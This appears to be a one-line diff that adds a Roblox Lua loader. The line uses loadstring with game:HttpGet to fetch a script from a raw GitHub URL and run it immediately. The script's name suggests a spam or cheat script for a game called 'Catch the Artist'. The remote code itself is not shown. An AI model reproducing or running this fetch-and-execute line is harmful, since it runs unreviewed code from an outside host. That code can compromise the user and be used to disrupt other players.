@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/catch-the-artist-spam6-lt1d08lso562uh.lua"))()
